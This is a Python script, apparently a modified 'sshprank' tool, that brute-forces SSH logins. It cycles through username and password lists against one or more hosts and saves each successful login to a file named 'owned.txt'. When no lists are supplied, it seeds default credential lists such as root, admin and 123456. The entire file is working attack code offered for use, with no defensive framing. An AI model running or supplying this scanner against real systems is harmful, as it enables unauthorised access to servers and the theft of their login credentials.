#!/usr/bin/env python3

import sys
import os
import argparse
import socket
import threading
import time
import random
import subprocess
from concurrent.futures import ThreadPoolExecutor

def banner():
    print(r"""
              __                           __
   __________/ /_  ____  _________ _____  / /__
  / ___/ ___/ __ / __ / ___/ __ / __ / //_/
 (__  |__  ) / / / /_/ / /  / /_/ / / / / ,<
/____/____/_/ /_/ .___/_/   \__,_/_/ /_/_/|_|
               /_/
      --== [ Modified Working Version ] ==--
    """)

def read_file(filename):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def ssh_connect(host, port, username, password, timeout=10):
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, password=password, 
                      timeout=timeout, banner_timeout=timeout)
        print(f"[+] SUCCESS: {username}:{password} @ {host}:{port}")
        
        with open('owned.txt', 'a') as f:
            f.write(f"{host}:{port}:{username}:{password}\n")
            
        client.close()
        return True
        
    except Exception as e:
        error_msg = str(e)
        if "Authentication failed" in error_msg:
            print(f"[-] Auth failed: {username}:{password} @ {host}:{port}")
        elif "Unable to connect" in error_msg:
            print(f"[-] Connect failed: {host}:{port}")
        else:
            print(f"[-] Error: {username} @ {host}:{port} - {error_msg[:50]}")
        return False

def main():
    banner()
    
    parser = argparse.ArgumentParser(description='SSH Password Scanner - Fixed Version', add_help=False)
    parser.add_argument('--help', action='store_true', help='Show help')
    parser.add_argument('--host', help='Single host to scan')
    parser.add_argument('--hosts-file', help='File with hosts list')
    parser.add_argument('--users', help='Username or users file')
    parser.add_argument('--passwords', help='Password or passwords file')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--port', type=int, default=22, help='SSH port')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads')
    
    args = parser.parse_args()
    
    if args.help:
        print("Usage: ./sshprank_working.py [options]")
        print("\nOptions:")
        print("  --help              Show this help")
        print("  --host HOST         Single host to scan")
        print("  --hosts-file FILE   File with hosts list") 
        print("  --users FILE        Username or users file")
        print("  --passwords FILE    Password or passwords file")
        print("  --port PORT         SSH port (default: 22)")
        print("  --threads N         Number of threads (default: 5)")
        print("  --verbose           Verbose output")
        print("\nExamples:")
        print("  ./sshprank_working.py --host 192.168.1.1 --users users.txt --passwords passes.txt")
        print("  ./sshprank_working.py --hosts-file hosts.txt --users admin --passwords password --verbose")
        return
    
    # Create test files if they don't exist
    if not os.path.exists('hosts.txt'):
        print("[*] Creating hosts.txt with sample data")
        with open('hosts.txt', 'w') as f:
            for i in range(1, 10):
                f.write(f"192.168.1.{i}\n")
    
    if not os.path.exists('lists'):
        os.makedirs('lists')
    
    if not os.path.exists('lists/user.txt'):
        print("[*] Creating lists/user.txt")
        with open('lists/user.txt', 'w') as f:
            f.write("root\nadmin\nuser\ntest\nubuntu\n")
    
    if not os.path.exists('lists/pass.txt'):
        print("[*] Creating lists/pass.txt") 
        with open('lists/pass.txt', 'w') as f:
            f.write("root\nadmin\n123456\npassword\n1234\ntest\n")
    
    # Read targets
    hosts = []
    if args.host:
        hosts = [args.host]
    elif args.hosts_file:
        hosts = read_file(args.hosts_file)
    else:
        print("[-] No hosts specified. Using hosts.txt")
        hosts = read_file('hosts.txt')
    
    if not hosts:
        print("[-] No hosts found to scan")
        return
    
    # Read credentials
    users = []
    if args.users:
        if os.path.isfile(args.users):
            users = read_file(args.users)
        else:
            users = [args.users]
    else:
        users = read_file('lists/user.txt')
    
    passwords = []
    if args.passwords:
        if os.path.isfile(args.passwords):
            passwords = read_file(args.passwords)
        else:
            passwords = [args.passwords]
    else:
        passwords = read_file('lists/pass.txt')
    
    print(f"[*] Starting SSH scan:")
    print(f"    Hosts: {len(hosts)}")
    print(f"    Users: {len(users)}")
    print(f"    Passwords: {len(passwords)}")
    print(f"    Port: {args.port}")
    print(f"    Threads: {args.threads}")
    print("")
    
    # Clear previous results
    open('owned.txt', 'w').close()
    
    # Start scanning
    success_count = 0
    for i, host in enumerate(hosts, 1):
        print(f"[{i}/{len(hosts)}] Scanning: {host}")
        for user in users:
            for password in passwords:
                if ssh_connect(host, args.port, user, password):
                    success_count += 1
                time.sleep(0.1)  # Small delay to avoid overwhelming
    
    print(f"\n[*] Scan completed. Found {success_count} valid credentials")
    print("[*] Results saved to owned.txt")
    
    # Show results
    try:
        with open('owned.txt', 'r') as f:
            results = f.read().strip()
            if results:
                print("\n[+] Found credentials:")
                print(results)
    except:
        pass

if __name__ == "__main__":
    main()
